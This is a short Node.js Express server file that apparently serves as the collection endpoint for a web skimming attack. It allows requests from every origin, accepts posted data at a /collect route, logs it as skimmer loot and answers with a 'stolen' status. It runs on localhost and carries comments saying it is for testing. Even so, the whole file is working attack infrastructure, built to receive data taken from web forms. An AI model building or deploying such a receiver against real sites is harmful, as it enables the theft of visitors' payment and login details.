// server.js - Run on port 3000
const express = require('express');
const cors = require('cors');
const app = express();

// Allow ALL origins (for testing)
app.use(cors({
    origin: '*', // ⚠️ Dangerous - only for testing
    methods: ['POST', 'GET', 'OPTIONS']
}));

app.use(express.json());

// Skimmer endpoint
app.post('/collect', (req, res) => {
    console.log('📬 Skimmer received:', req.body);
    res.json({ status: 'stolen' }); // Send response to avoid CORS errors
});

// Add preflight handling
app.options('/collect', cors());

app.listen(3000, () => {
    console.log('🛡️ Skimmer server listening on http://localhost:3000');
});